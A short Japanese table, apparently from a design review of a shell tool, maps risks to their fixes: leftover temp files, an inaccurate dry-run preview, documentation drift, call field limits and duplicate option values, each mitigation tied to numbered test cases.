| 検証エラー時に temp が残る | §1.4 の「検証はすべて `mktemp` より前」+ 引数パース直後の `trap` + RE9 の 6 経路 + RE9b / RE9c / RE19 |
| `--dry-run` が嘘のプレビューを出す | RE18b（dry-run 出力 == 実書き込み結果） |
| doc 同期漏れ | §3 を**節単位**で列挙（guide-ja.md は 4 箇所、README.md は 2 箇所、CLAUDE.md は 6 箇所） |
| 6 フィールドが 1 コールに収まらない | M2 / M3 の 2 コールに分割済み。各 3 問 × 4 選択肢で上限内 |
| 選択肢が実効同値で埋まる | 静的表を廃し、現在値と実効既定値を除外する動的規則にした。規則 3 は現在値 == 実効既定値のとき `back to the default` を出さない |
